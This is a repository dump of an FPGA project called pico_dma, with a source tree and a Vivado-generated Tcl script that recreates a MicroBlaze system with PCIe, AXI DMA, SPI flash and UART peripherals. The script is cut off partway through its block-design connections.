Project Path: arc_gmh5225_pico_dma_fj0bm7tq

Source Tree:

```txt
arc_gmh5225_pico_dma_fj0bm7tq
├── 7x_pcie_microblaze.bin
├── 7x_pcie_microblaze.bit
├── 7x_pcie_microblaze.tcl
├── 7x_pcie_microblaze.xsa
├── Makefile
├── README.md
├── docs
│   └── images
│       ├── boards.jpg
│       ├── pico_evb_cable.png
│       └── pico_evb_pinout.png
├── hdl
│   ├── 7x_pcie_microblaze.v
│   ├── pcie_7x_0_pipe_clock.v
│   ├── pcie_7x_0_support.v
│   └── pico_evb.xdc
├── ip
│   ├── axis_data_fifo_0.xci
│   ├── axis_data_fifo_1.xci
│   └── pcie_7x_0.xci
├── microblaze_soc.pdf
└── software
    └── application
        ├── Debug
        │   └── application.elf
        ├── Release
        │   └── application.elf
        ├── application.prj
        └── src
            ├── application.c
            ├── axi_dma.c
            ├── axi_dma.h
            ├── axis_pcie.c
            ├── axis_pcie.h
            ├── common.h
            ├── efi.h
            ├── efi_image.h
            ├── flash.c
            ├── flash.h
            ├── lscript.ld
            ├── pcie_tlp.c
            ├── pcie_tlp.h
            ├── platform.c
            ├── platform.h
            ├── platform_config.h
            └── protocol.h

```

`7x_pcie_microblaze.tcl`:

```tcl
#*****************************************************************************************
# Vivado (TM) v2019.2 (64-bit)
#
# 7x_pcie_microblaze.tcl: Tcl script for re-creating project '7x_pcie_microblaze'
#
# Generated by Vivado on Thu Nov 26 02:39:36 +07 2020
# IP Build 2700528 on Thu Nov  7 00:09:20 MST 2019
#
# This file contains the Vivado Tcl commands for re-creating the project to the state*
# when this script was generated. In order to re-create the project, please source this
# file in the Vivado Tcl Shell.
#
# * Note that the runs in the created project will be configured the same way as the
#   original project, however they will not be launched automatically. To regenerate the
#   run results please launch the synthesis/implementation runs as needed.
#
#*****************************************************************************************
# NOTE: In order to use this script for source control purposes, please make sure that the
#       following files are added to the source control system:-
#
# 1. This project restoration tcl script (7x_pcie_microblaze.tcl) that was generated.
#
# 2. The following source(s) files that were local or imported into the original project.
#    (Please see the '$orig_proj_dir' and '$origin_dir' variable setting below at the start of the script)
#
#    "/home/user/Documents/Vivado/7x_pcie_microblaze/7x_pcie_microblaze.srcs/sources_1/imports/hdl/pcie_7x_0_pipe_clock.v"
#    "/home/user/Documents/Vivado/7x_pcie_microblaze/7x_pcie_microblaze.srcs/sources_1/imports/hdl/pcie_7x_0_support.v"
#    "/home/user/Documents/Vivado/7x_pcie_microblaze/7x_pcie_microblaze.srcs/sources_1/imports/hdl/7x_pcie_microblaze.v"
#    "/home/user/Documents/Vivado/7x_pcie_microblaze/software/application/Debug/application.elf"
#    "/home/user/Documents/Vivado/7x_pcie_microblaze/7x_pcie_microblaze.srcs/sources_1/ip/pcie_7x_0/pcie_7x_0.xci"
#    "/home/user/Documents/Vivado/7x_pcie_microblaze/7x_pcie_microblaze.srcs/sources_1/ip/axis_data_fifo_1/axis_data_fifo_1.xci"
#    "/home/user/Documents/Vivado/7x_pcie_microblaze/7x_pcie_microblaze.srcs/sources_1/ip/axis_data_fifo_0/axis_data_fifo_0.xci"
#    "/home/user/Documents/Vivado/7x_pcie_microblaze/7x_pcie_microblaze.srcs/constrs_1/pico_evb.xdc"
#
# 3. The following remote source files that were added to the original project:-
#
#    <none>
#
#*****************************************************************************************

# Set the reference directory for source file relative paths (by default the value is script directory path)
set origin_dir "."

# Use origin directory path location variable, if specified in the tcl shell
if { [info exists ::origin_dir_loc] } {
  set origin_dir $::origin_dir_loc
}

# Set the project name
set _xil_proj_name_ "7x_pcie_microblaze"

# Use project name variable, if specified in the tcl shell
if { [info exists ::user_project_name] } {
  set _xil_proj_name_ $::user_project_name
}

variable script_file
set script_file "7x_pcie_microblaze.tcl"

# Help information for this script
proc print_help {} {
  variable script_file
  puts "\nDescription:"
  puts "Recreate a Vivado project from this script. The created project will be"
  puts "functionally equivalent to the original project for which this script was"
  puts "generated. The script contains commands for creating a project, filesets,"
  puts "runs, adding/importing sources and setting properties on various objects.\n"
  puts "Syntax:"
  puts "$script_file"
  puts "$script_file -tclargs \[--origin_dir <path>\]"
  puts "$script_file -tclargs \[--project_name <name>\]"
  puts "$script_file -tclargs \[--help\]\n"
  puts "Usage:"
  puts "Name                   Description"
  puts "-------------------------------------------------------------------------"
  puts "\[--origin_dir <path>\]  Determine source file paths wrt this path. Default"
  puts "                       origin_dir path value is \".\", otherwise, the value"
  puts "                       that was set with the \"-paths_relative_to\" switch"
  puts "                       when this script was generated.\n"
  puts "\[--project_name <name>\] Create project with the specified name. Default"
  puts "                       name is the name of the project from where this"
  puts "                       script was generated.\n"
  puts "\[--help\]               Print help information for this script"
  puts "-------------------------------------------------------------------------\n"
  exit 0
}

if { $::argc > 0 } {
  for {set i 0} {$i < $::argc} {incr i} {
    set option [string trim [lindex $::argv $i]]
    switch -regexp -- $option {
      "--origin_dir"   { incr i; set origin_dir [lindex $::argv $i] }
      "--project_name" { incr i; set _xil_proj_name_ [lindex $::argv $i] }
      "--help"         { print_help }
      default {
        if { [regexp {^-} $option] } {
          puts "ERROR: Unknown option '$option' specified, please type '$script_file -tclargs --help' for usage info.\n"
          return 1
        }
      }
    }
  }
}

# Set the directory path for the original project from where this script was exported
set orig_proj_dir "[file normalize "$origin_dir/"]"

# Create project
create_project ${_xil_proj_name_} ./${_xil_proj_name_} -part xc7a50tcsg325-2

# Set the directory path for the new project
set proj_dir [get_property directory [current_project]]

# Set project properties
set obj [current_project]
set_property -name "default_lib" -value "xil_defaultlib" -objects $obj
set_property -name "enable_vhdl_2008" -value "1" -objects $obj
set_property -name "ip_cache_permissions" -value "read write" -objects $obj
set_property -name "ip_output_repo" -value "$proj_dir/${_xil_proj_name_}.cache/ip" -objects $obj
set_property -name "mem.enable_memory_map_generation" -value "1" -objects $obj
set_property -name "part" -value "xc7a50tcsg325-2" -objects $obj
set_property -name "sim.central_dir" -value "$proj_dir/${_xil_proj_name_}.ip_user_files" -objects $obj
set_property -name "sim.ip.auto_export_scripts" -value "1" -objects $obj
set_property -name "simulator_language" -value "Mixed" -objects $obj
set_property -name "webtalk.activehdl_export_sim" -value "12" -objects $obj
set_property -name "webtalk.ies_export_sim" -value "12" -objects $obj
set_property -name "webtalk.modelsim_export_sim" -value "12" -objects $obj
set_property -name "webtalk.questa_export_sim" -value "12" -objects $obj
set_property -name "webtalk.riviera_export_sim" -value "12" -objects $obj
set_property -name "webtalk.vcs_export_sim" -value "12" -objects $obj
set_property -name "webtalk.xsim_export_sim" -value "12" -objects $obj
set_property -name "xpm_libraries" -value "XPM_CDC XPM_FIFO XPM_MEMORY" -objects $obj

# Create 'sources_1' fileset (if not found)
if {[string equal [get_filesets -quiet sources_1] ""]} {
  create_fileset -srcset sources_1
}

# Set 'sources_1' fileset object
set obj [get_filesets sources_1]
# Import local files from the original project
set files [list \
 [file normalize "${origin_dir}/hdl/pcie_7x_0_pipe_clock.v" ]\
 [file normalize "${origin_dir}/hdl/pcie_7x_0_support.v" ]\
 [file normalize "${origin_dir}/hdl/7x_pcie_microblaze.v" ]\
 [file normalize "${origin_dir}/software/application/Debug/application.elf" ]\
]
set imported_files [import_files -fileset sources_1 $files]

# Set 'sources_1' fileset file properties for remote files
# None

# Set 'sources_1' fileset file properties for local files
set file "Debug/application.elf"
set file_obj [get_files -of_objects [get_filesets sources_1] [list "*$file"]]
set_property -name "scoped_to_cells" -value "microblaze_0" -objects $file_obj
set_property -name "scoped_to_ref" -value "microblaze" -objects $file_obj
set_property -name "used_in" -value "implementation" -objects $file_obj
set_property -name "used_in_simulation" -value "0" -objects $file_obj


# Set 'sources_1' fileset properties
set obj [get_filesets sources_1]
set_property -name "top" -value "pcie_microblaze_top" -objects $obj

# Set 'sources_1' fileset object
set obj [get_filesets sources_1]
# Import local files from the original project
set files [list \
 [file normalize "${origin_dir}/ip/pcie_7x_0.xci" ]\
]
set imported_files [import_files -fileset sources_1 $files]

# Set 'sources_1' fileset file properties for remote files
# None

# Set 'sources_1' fileset file properties for local files
set file "pcie_7x_0/pcie_7x_0.xci"
set file_obj [get_files -of_objects [get_filesets sources_1] [list "*$file"]]
set_property -name "generate_files_for_reference" -value "0" -objects $file_obj
set_property -name "registered_with_manager" -value "1" -objects $file_obj
if { ![get_property "is_locked" $file_obj] } {
  set_property -name "synth_checkpoint_mode" -value "Singular" -objects $file_obj
}


# Set 'sources_1' fileset object
set obj [get_filesets sources_1]
# Import local files from the original project
set files [list \
 [file normalize "${origin_dir}/ip/axis_data_fifo_1.xci" ]\
]
set imported_files [import_files -fileset sources_1 $files]

# Set 'sources_1' fileset file properties for remote files
# None

# Set 'sources_1' fileset file properties for local files
set file "axis_data_fifo_1/axis_data_fifo_1.xci"
set file_obj [get_files -of_objects [get_filesets sources_1] [list "*$file"]]
set_property -name "generate_files_for_reference" -value "0" -objects $file_obj
set_property -name "registered_with_manager" -value "1" -objects $file_obj
if { ![get_property "is_locked" $file_obj] } {
  set_property -name "synth_checkpoint_mode" -value "Singular" -objects $file_obj
}


# Set 'sources_1' fileset object
set obj [get_filesets sources_1]
# Import local files from the original project
set files [list \
 [file normalize "${origin_dir}/ip/axis_data_fifo_0.xci" ]\
]
set imported_files [import_files -fileset sources_1 $files]

# Set 'sources_1' fileset file properties for remote files
# None

# Set 'sources_1' fileset file properties for local files
set file "axis_data_fifo_0/axis_data_fifo_0.xci"
set file_obj [get_files -of_objects [get_filesets sources_1] [list "*$file"]]
set_property -name "generate_files_for_reference" -value "0" -objects $file_obj
set_property -name "registered_with_manager" -value "1" -objects $file_obj
if { ![get_property "is_locked" $file_obj] } {
  set_property -name "synth_checkpoint_mode" -value "Singular" -objects $file_obj
}


# Create 'constrs_1' fileset (if not found)
if {[string equal [get_filesets -quiet constrs_1] ""]} {
  create_fileset -constrset constrs_1
}

# Set 'constrs_1' fileset object
set obj [get_filesets constrs_1]

# Add/Import constrs file and set constrs file properties
set file "[file normalize "$origin_dir/hdl/pico_evb.xdc"]"
set file_imported [import_files -fileset constrs_1 [list $file]]
set file "pico_evb.xdc"
set file_obj [get_files -of_objects [get_filesets constrs_1] [list "*$file"]]
set_property -name "file_type" -value "XDC" -objects $file_obj

# Set 'constrs_1' fileset properties
set obj [get_filesets constrs_1]
set_property -name "target_part" -value "xc7a50tcsg325-2" -objects $obj

# Create 'sim_1' fileset (if not found)
if {[string equal [get_filesets -quiet sim_1] ""]} {
  create_fileset -simset sim_1
}

# Set 'sim_1' fileset object
set obj [get_filesets sim_1]
# Empty (no sources present)

# Set 'sim_1' fileset properties
set obj [get_filesets sim_1]
set_property -name "top" -value "pcie_microblaze_top" -objects $obj
set_property -name "top_lib" -value "xil_defaultlib" -objects $obj

# Set 'utils_1' fileset object
set obj [get_filesets utils_1]
# Empty (no sources present)

# Set 'utils_1' fileset properties
set obj [get_filesets utils_1]


# Adding sources referenced in BDs, if not already added


# Proc to create BD microblaze
proc cr_bd_microblaze { parentCell } {

  # CHANGE DESIGN NAME HERE
  set design_name microblaze

  common::send_msg_id "BD_TCL-003" "INFO" "Currently there is no design <$design_name> in project, so creating one..."

  create_bd_design $design_name

  set bCheckIPsPassed 1
  ##################################################################
  # CHECK IPs
  ##################################################################
  set bCheckIPs 1
  if { $bCheckIPs == 1 } {
     set list_check_ips "\ 
  xilinx.com:ip:axi_bram_ctrl:4.1\
  xilinx.com:ip:blk_mem_gen:8.4\
  xilinx.com:ip:axi_dma:7.1\
  xilinx.com:ip:axi_gpio:2.0\
  xilinx.com:ip:axi_quad_spi:3.2\
  xilinx.com:ip:axi_uartlite:2.0\
  xilinx.com:ip:clk_wiz:6.0\
  xilinx.com:ip:mdm:3.2\
  xilinx.com:ip:microblaze:11.0\
  xilinx.com:ip:axi_intc:4.1\
  xilinx.com:ip:xlconcat:2.1\
  xilinx.com:ip:proc_sys_reset:5.0\
  xilinx.com:ip:lmb_bram_if_cntlr:4.0\
  xilinx.com:ip:lmb_v10:3.0\
  "

   set list_ips_missing ""
   common::send_msg_id "BD_TCL-006" "INFO" "Checking if the following IPs exist in the project's IP catalog: $list_check_ips ."

   foreach ip_vlnv $list_check_ips {
      set ip_obj [get_ipdefs -all $ip_vlnv]
      if { $ip_obj eq "" } {
         lappend list_ips_missing $ip_vlnv
      }
   }

   if { $list_ips_missing ne "" } {
      catch {common::send_msg_id "BD_TCL-115" "ERROR" "The following IPs are not found in the IP Catalog:\n  $list_ips_missing\n\nResolution: Please add the repository containing the IP(s) to the project." }
      set bCheckIPsPassed 0
   }

  }

  if { $bCheckIPsPassed != 1 } {
    common::send_msg_id "BD_TCL-1003" "WARNING" "Will not continue with creation of design due to the error(s) above."
    return 3
  }

  
# Hierarchical cell: microblaze_0_local_memory
proc create_hier_cell_microblaze_0_local_memory { parentCell nameHier } {

  variable script_folder

  if { $parentCell eq "" || $nameHier eq "" } {
     catch {common::send_msg_id "BD_TCL-102" "ERROR" "create_hier_cell_microblaze_0_local_memory() - Empty argument(s)!"}
     return
  }

  # Get object for parentCell
  set parentObj [get_bd_cells $parentCell]
  if { $parentObj == "" } {
     catch {common::send_msg_id "BD_TCL-100" "ERROR" "Unable to find parent cell <$parentCell>!"}
     return
  }

  # Make sure parentObj is hier blk
  set parentType [get_property TYPE $parentObj]
  if { $parentType ne "hier" } {
     catch {common::send_msg_id "BD_TCL-101" "ERROR" "Parent <$parentObj> has TYPE = <$parentType>. Expected to be <hier>."}
     return
  }

  # Save current instance; Restore later
  set oldCurInst [current_bd_instance .]

  # Set parent object as current
  current_bd_instance $parentObj

  # Create cell and set as current instance
  set hier_obj [create_bd_cell -type hier $nameHier]
  current_bd_instance $hier_obj

  # Create interface pins
  create_bd_intf_pin -mode MirroredMaster -vlnv xilinx.com:interface:lmb_rtl:1.0 DLMB

  create_bd_intf_pin -mode MirroredMaster -vlnv xilinx.com:interface:lmb_rtl:1.0 ILMB


  # Create pins
  create_bd_pin -dir I -type clk LMB_Clk
  create_bd_pin -dir I -type rst SYS_Rst

  # Create instance: dlmb_bram_if_cntlr, and set properties
  set dlmb_bram_if_cntlr [ create_bd_cell -type ip -vlnv xilinx.com:ip:lmb_bram_if_cntlr:4.0 dlmb_bram_if_cntlr ]
  set_property -dict [ list \
   CONFIG.C_ECC {0} \
 ] $dlmb_bram_if_cntlr

  # Create instance: dlmb_v10, and set properties
  set dlmb_v10 [ create_bd_cell -type ip -vlnv xilinx.com:ip:lmb_v10:3.0 dlmb_v10 ]

  # Create instance: ilmb_bram_if_cntlr, and set properties
  set ilmb_bram_if_cntlr [ create_bd_cell -type ip -vlnv xilinx.com:ip:lmb_bram_if_cntlr:4.0 ilmb_bram_if_cntlr ]
  set_property -dict [ list \
   CONFIG.C_ECC {0} \
 ] $ilmb_bram_if_cntlr

  # Create instance: ilmb_v10, and set properties
  set ilmb_v10 [ create_bd_cell -type ip -vlnv xilinx.com:ip:lmb_v10:3.0 ilmb_v10 ]

  # Create instance: lmb_bram, and set properties
  set lmb_bram [ create_bd_cell -type ip -vlnv xilinx.com:ip:blk_mem_gen:8.4 lmb_bram ]
  set_property -dict [ list \
   CONFIG.Memory_Type {True_Dual_Port_RAM} \
   CONFIG.use_bram_block {BRAM_Controller} \
 ] $lmb_bram

  # Create interface connections
  connect_bd_intf_net -intf_net microblaze_0_dlmb [get_bd_intf_pins DLMB] [get_bd_intf_pins dlmb_v10/LMB_M]
  connect_bd_intf_net -intf_net microblaze_0_dlmb_bus [get_bd_intf_pins dlmb_bram_if_cntlr/SLMB] [get_bd_intf_pins dlmb_v10/LMB_Sl_0]
  connect_bd_intf_net -intf_net microblaze_0_dlmb_cntlr [get_bd_intf_pins dlmb_bram_if_cntlr/BRAM_PORT] [get_bd_intf_pins lmb_bram/BRAM_PORTA]
  connect_bd_intf_net -intf_net microblaze_0_ilmb [get_bd_intf_pins ILMB] [get_bd_intf_pins ilmb_v10/LMB_M]
  connect_bd_intf_net -intf_net microblaze_0_ilmb_bus [get_bd_intf_pins ilmb_bram_if_cntlr/SLMB] [get_bd_intf_pins ilmb_v10/LMB_Sl_0]
  connect_bd_intf_net -intf_net microblaze_0_ilmb_cntlr [get_bd_intf_pins ilmb_bram_if_cntlr/BRAM_PORT] [get_bd_intf_pins lmb_bram/BRAM_PORTB]

  # Create port connections
  connect_bd_net -net SYS_Rst_1 [get_bd_pins SYS_Rst] [get_bd_pins dlmb_bram_if_cntlr/LMB_Rst] [get_bd_pins dlmb_v10/SYS_Rst] [get_bd_pins ilmb_bram_if_cntlr/LMB_Rst] [get_bd_pins ilmb_v10/SYS_Rst]
  connect_bd_net -net microblaze_0_Clk [get_bd_pins LMB_Clk] [get_bd_pins dlmb_bram_if_cntlr/LMB_Clk] [get_bd_pins dlmb_v10/LMB_Clk] [get_bd_pins ilmb_bram_if_cntlr/LMB_Clk] [get_bd_pins ilmb_v10/LMB_Clk]

  # Restore current instance
  current_bd_instance $oldCurInst
}
  variable script_folder

  if { $parentCell eq "" } {
     set parentCell [get_bd_cells /]
  }

  # Get object for parentCell
  set parentObj [get_bd_cells $parentCell]
  if { $parentObj == "" } {
     catch {common::send_msg_id "BD_TCL-100" "ERROR" "Unable to find parent cell <$parentCell>!"}
     return
  }

  # Make sure parentObj is hier blk
  set parentType [get_property TYPE $parentObj]
  if { $parentType ne "hier" } {
     catch {common::send_msg_id "BD_TCL-101" "ERROR" "Parent <$parentObj> has TYPE = <$parentType>. Expected to be <hier>."}
     return
  }

  # Save current instance; Restore later
  set oldCurInst [current_bd_instance .]

  # Set parent object as current
  current_bd_instance $parentObj


  # Create interface ports
  set M0_AXIS_0 [ create_bd_intf_port -mode Master -vlnv xilinx.com:interface:axis_rtl:1.0 M0_AXIS_0 ]

  set M_AXIS_MM2S_0 [ create_bd_intf_port -mode Master -vlnv xilinx.com:interface:axis_rtl:1.0 M_AXIS_MM2S_0 ]

  set S0_AXIS_0 [ create_bd_intf_port -mode Slave -vlnv xilinx.com:interface:axis_rtl:1.0 S0_AXIS_0 ]
  set_property -dict [ list \
   CONFIG.HAS_TKEEP {0} \
   CONFIG.HAS_TLAST {1} \
   CONFIG.HAS_TREADY {1} \
   CONFIG.HAS_TSTRB {0} \
   CONFIG.LAYERED_METADATA {undef} \
   CONFIG.TDATA_NUM_BYTES {4} \
   CONFIG.TDEST_WIDTH {0} \
   CONFIG.TID_WIDTH {0} \
   CONFIG.TUSER_WIDTH {0} \
   ] $S0_AXIS_0

  set S_AXIS_S2MM_0 [ create_bd_intf_port -mode Slave -vlnv xilinx.com:interface:axis_rtl:1.0 S_AXIS_S2MM_0 ]
  set_property -dict [ list \
   CONFIG.HAS_TKEEP {1} \
   CONFIG.HAS_TLAST {1} \
   CONFIG.HAS_TREADY {1} \
   CONFIG.HAS_TSTRB {0} \
   CONFIG.LAYERED_METADATA {undef} \
   CONFIG.TDATA_NUM_BYTES {8} \
   CONFIG.TDEST_WIDTH {0} \
   CONFIG.TID_WIDTH {0} \
   CONFIG.TUSER_WIDTH {0} \
   ] $S_AXIS_S2MM_0

  set gpio_in [ create_bd_intf_port -mode Master -vlnv xilinx.com:interface:gpio_rtl:1.0 gpio_in ]

  set gpio_out [ create_bd_intf_port -mode Master -vlnv xilinx.com:interface:gpio_rtl:1.0 gpio_out ]

  set spi [ create_bd_intf_port -mode Master -vlnv xilinx.com:interface:spi_rtl:1.0 spi ]

  set uart [ create_bd_intf_port -mode Master -vlnv xilinx.com:interface:uart_rtl:1.0 uart ]


  # Create ports
  set clk_out [ create_bd_port -dir O -type clk clk_out ]
  set_property -dict [ list \
   CONFIG.ASSOCIATED_BUSIF {S_AXIS_S2MM_0:M_AXIS_MM2S_0:S0_AXIS_0:M0_AXIS_0} \
 ] $clk_out
  set sys_clk [ create_bd_port -dir I -type clk sys_clk ]
  set sys_rst_n [ create_bd_port -dir I -type rst sys_rst_n ]
  set_property -dict [ list \
   CONFIG.POLARITY {ACTIVE_LOW} \
 ] $sys_rst_n

  # Create instance: axi_bram_ctrl_0, and set properties
  set axi_bram_ctrl_0 [ create_bd_cell -type ip -vlnv xilinx.com:ip:axi_bram_ctrl:4.1 axi_bram_ctrl_0 ]

  # Create instance: axi_bram_ctrl_0_bram, and set properties
  set axi_bram_ctrl_0_bram [ create_bd_cell -type ip -vlnv xilinx.com:ip:blk_mem_gen:8.4 axi_bram_ctrl_0_bram ]
  set_property -dict [ list \
   CONFIG.Memory_Type {True_Dual_Port_RAM} \
 ] $axi_bram_ctrl_0_bram

  # Create instance: axi_dma_0, and set properties
  set axi_dma_0 [ create_bd_cell -type ip -vlnv xilinx.com:ip:axi_dma:7.1 axi_dma_0 ]
  set_property -dict [ list \
   CONFIG.c_include_sg {0} \
   CONFIG.c_m_axi_mm2s_data_width {64} \
   CONFIG.c_m_axi_s2mm_data_width {64} \
   CONFIG.c_m_axis_mm2s_tdata_width {64} \
   CONFIG.c_mm2s_burst_size {16} \
   CONFIG.c_s_axis_s2mm_tdata_width {64} \
   CONFIG.c_sg_include_stscntrl_strm {0} \
 ] $axi_dma_0

  # Create instance: axi_gpio_0, and set properties
  set axi_gpio_0 [ create_bd_cell -type ip -vlnv xilinx.com:ip:axi_gpio:2.0 axi_gpio_0 ]
  set_property -dict [ list \
   CONFIG.C_ALL_INPUTS {1} \
   CONFIG.C_ALL_OUTPUTS_2 {1} \
   CONFIG.C_IS_DUAL {1} \
 ] $axi_gpio_0

  # Create instance: axi_quad_spi_0, and set properties
  set axi_quad_spi_0 [ create_bd_cell -type ip -vlnv xilinx.com:ip:axi_quad_spi:3.2 axi_quad_spi_0 ]
  set_property -dict [ list \
   CONFIG.C_FIFO_DEPTH {256} \
   CONFIG.C_SCK_RATIO {2} \
   CONFIG.C_SPI_MEMORY {3} \
   CONFIG.C_SPI_MODE {2} \
   CONFIG.C_TYPE_OF_AXI4_INTERFACE {0} \
   CONFIG.C_USE_STARTUP {1} \
   CONFIG.C_USE_STARTUP_INT {1} \
   CONFIG.C_XIP_MODE {0} \
   CONFIG.FIFO_INCLUDED {1} \
 ] $axi_quad_spi_0

  # Create instance: axi_uartlite_0, and set properties
  set axi_uartlite_0 [ create_bd_cell -type ip -vlnv xilinx.com:ip:axi_uartlite:2.0 axi_uartlite_0 ]
  set_property -dict [ list \
   CONFIG.C_BAUDRATE {115200} \
 ] $axi_uartlite_0

  # Create instance: clk_wiz_1, and set properties
  set clk_wiz_1 [ create_bd_cell -type ip -vlnv xilinx.com:ip:clk_wiz:6.0 clk_wiz_1 ]
  set_property -dict [ list \
   CONFIG.CLKOUT1_JITTER {130.958} \
   CONFIG.CLKOUT1_PHASE_ERROR {98.575} \
   CONFIG.CLKOUT1_REQUESTED_OUT_FREQ {100.000} \
   CONFIG.MMCM_CLKFBOUT_MULT_F {10.000} \
   CONFIG.MMCM_CLKOUT0_DIVIDE_F {10.000} \
   CONFIG.PRIM_SOURCE {Global_buffer} \
 ] $clk_wiz_1

  # Create instance: mdm_1, and set properties
  set mdm_1 [ create_bd_cell -type ip -vlnv xilinx.com:ip:mdm:3.2 mdm_1 ]

  # Create instance: microblaze_0, and set properties
  set microblaze_0 [ create_bd_cell -type ip -vlnv xilinx.com:ip:microblaze:11.0 microblaze_0 ]
  set_property -dict [ list \
   CONFIG.C_ADDR_TAG_BITS {0} \
   CONFIG.C_DCACHE_ADDR_TAG {0} \
   CONFIG.C_DEBUG_ENABLED {1} \
   CONFIG.C_D_AXI {1} \
   CONFIG.C_D_LMB {1} \
   CONFIG.C_FSL_LINKS {1} \
   CONFIG.C_I_LMB {1} \
   CONFIG.C_USE_BARREL {1} \
   CONFIG.C_USE_BRANCH_TARGET_CACHE {1} \
   CONFIG.C_USE_DIV {1} \
   CONFIG.C_USE_HW_MUL {1} \
   CONFIG.C_USE_PCMP_INSTR {1} \
 ] $microblaze_0

  # Create instance: microblaze_0_axi_intc, and set properties
  set microblaze_0_axi_intc [ create_bd_cell -type ip -vlnv xilinx.com:ip:axi_intc:4.1 microblaze_0_axi_intc ]
  set_property -dict [ list \
   CONFIG.C_HAS_FAST {1} \
 ] $microblaze_0_axi_intc

  # Create instance: microblaze_0_axi_periph, and set properties
  set microblaze_0_axi_periph [ create_bd_cell -type ip -vlnv xilinx.com:ip:axi_interconnect:2.1 microblaze_0_axi_periph ]
  set_property -dict [ list \
   CONFIG.NUM_MI {7} \
   CONFIG.NUM_SI {3} \
 ] $microblaze_0_axi_periph

  # Create instance: microblaze_0_local_memory
  create_hier_cell_microblaze_0_local_memory [current_bd_instance .] microblaze_0_local_memory

  # Create instance: microblaze_0_xlconcat, and set properties
  set microblaze_0_xlconcat [ create_bd_cell -type ip -vlnv xilinx.com:ip:xlconcat:2.1 microblaze_0_xlconcat ]
  set_property -dict [ list \
   CONFIG.NUM_PORTS {4} \
 ] $microblaze_0_xlconcat

  # Create instance: rst_clk_wiz_1_100M, and set properties
  set rst_clk_wiz_1_100M [ create_bd_cell -type ip -vlnv xilinx.com:ip:proc_sys_reset:5.0 rst_clk_wiz_1_100M ]

  # Create interface connections
  connect_bd_intf_net -intf_net S0_AXIS_0_1 [get_bd_intf_ports S0_AXIS_0] [get_bd_intf_pins microblaze_0/S0_AXIS]
  connect_bd_intf_net -intf_net S_AXIS_S2MM_0_1 [get_bd_intf_ports S_AXIS_S2MM_0] [get_bd_intf_pins axi_dma_0/S_AXIS_S2MM]
  connect_bd_intf_net -intf_net axi_bram_ctrl_0_BRAM_PORTA [get_bd_intf_pins axi_bram_ctrl_0/BRAM_PORTA] [get_bd_intf_pins axi_bram_ctrl_0_bram/BRAM_PORTA]
  connect_bd_intf_net -intf_net axi_bram_ctrl_0_BRAM_PORTB [get_bd_intf_pins axi_bram_ctrl_0/BRAM_PORTB] [get_bd_intf_pins axi_bram_ctrl_0_bram/BRAM_PORTB]
  connect_bd_intf_net -intf_net axi_dma_0_M_AXIS_MM2S [get_bd_intf_ports M_AXIS_MM2S_0] [get_bd_intf_pins axi_dma_0/M_AXIS_MM2S]
  connect_bd_intf_net -intf_net axi_dma_0_M_AXI_MM2S [get_bd_intf_pins axi_dma_0/M_AXI_MM2S] [get_bd_intf_pins microblaze_0_axi_periph/S01_AXI]
  connect_bd_intf_net -intf_net axi_dma_0_M_AXI_S2MM [get_bd_intf_pins axi_dma_0/M_AXI_S2MM] [get_bd_intf_pins microblaze_0_axi_periph/S02_AXI]
  connect_bd_intf_net -intf_net axi_gpio_0_GPIO [get_bd_intf_ports gpio_in] [get_bd_intf_pins axi_gpio_0/GPIO]
  connect_bd_intf_net -intf_net axi_gpio_0_GPIO2 [get_bd_intf_ports gpio_out] [get_bd_intf_pins axi_gpio_0/GPIO2]
  connect_bd_intf_net -intf_net axi_quad_spi_0_SPI_0 [get_bd_intf_ports spi] [get_bd_intf_pins axi_quad_spi_0/SPI_0]
  connect_bd_intf_net -intf_net axi_uartlite_0_UART [get_bd_intf_ports uart] [get_bd_intf_pins axi_uartlite_0/UART]
  connect_bd_intf_net -intf_net microblaze_0_M0_AXIS [get_bd_intf_ports M0_AXIS_0] [get_bd_intf_pins microblaze_0/M0_AXIS]
  connect_bd_intf_net -intf_net microblaze_0_axi_dp [get_bd_intf_pins microblaze_0/M_AXI_DP] [get_bd_intf_pins microblaze_0_axi_periph/S00_AXI]
  connect_bd_intf_net -intf_net microblaze_0_axi_periph_M01_AXI [get_bd_intf_pins axi_dma_0/S_AXI_LITE] [get_bd_intf_pins microblaze_0_axi_periph/M01_AXI]
  connect_bd_intf_net -intf_net microblaze_0_axi_periph_M02_AXI [get_bd_intf_pins axi_uartlite_0/S_AXI] [get_bd_intf_pins microblaze_0_axi_periph/M02_AXI]
  connect_bd_intf_net -intf_net microblaze_0_axi_periph_M03_AXI [get_bd_intf_pins axi_bram_ctrl_0/S_AXI] [get_bd_intf_pins microblaze_0_axi_periph/M03_AXI]
  connect_bd_intf_net -intf_net microblaze_0_axi_periph_M04_AXI [get_bd_intf_pins axi_gpio_0/S_AXI] [get_bd_intf_pins microblaze_0_axi_periph/M04_AXI]
  connect_bd_intf_net -intf_net microblaze_0_axi_periph_M05_AXI [get_bd_intf_pins axi_quad_spi_0/AXI_LITE] [get_bd_intf_pins microblaze_0_axi_periph/M05_AXI]
  connect_bd_intf_net -intf_net microblaze_0_debug [get_bd_intf_pins mdm_1/MBDEBUG_0] [get_bd_intf_pins microblaze_0/DEBUG]
  connect_bd_intf_net -intf_net microblaze_0_dlmb_1 [get_bd_intf_pins microblaze_0/DLMB] [get_bd_intf_pins microblaze_0_local_memory/DLMB]
  connect_bd_intf_net -intf_net microblaze_0_ilmb_1 [get_bd_intf_pins microblaze_0/ILMB] [get_bd_intf_pins microblaze_0_local_memory/ILMB]
  connect_bd_intf_net -intf_net microblaze_0_intc_axi [get_bd_intf_pins microblaze_0_axi_intc/s_axi] [get_bd_intf_pins microblaze_0_axi_periph/M00_AXI]
  connect_bd_intf_net -intf_net microblaze_0_interrupt [get_bd_intf_pins microblaze_0/INTERRUPT] [get_bd_intf_pins microblaze_0_axi_intc/interrupt]

  # Create port connections
  connect_bd_net -net axi_dma_0_mm2s_introut [get_bd_pins axi_dma_0/mm2s_introut] [get_bd_pins microblaze_0_xlconcat/In1]
  connect_bd_net -net axi_dma_0_s2mm_introut [get_bd_pins axi_dma_0/s2mm_introut] [get_bd_pins microblaze_0_xlconcat/In2]
  connect_bd_net -net axi_quad_spi_0_ip2intc_irpt [get_bd_pins axi_quad_spi_0/ip2intc_irpt] [get_bd_pins microblaze_0_xlconcat/In3]
  connect_bd_net -net axi_uartlite_0_interrupt [get_bd_pins axi_uartlite_0/interrupt] [get_bd_pins microblaze_0_xlconcat/In0]
  connect_bd_net -net clk_in1_0_1 [get_bd_ports sys_clk] [get_bd_pins clk_wiz_1/clk_in1]
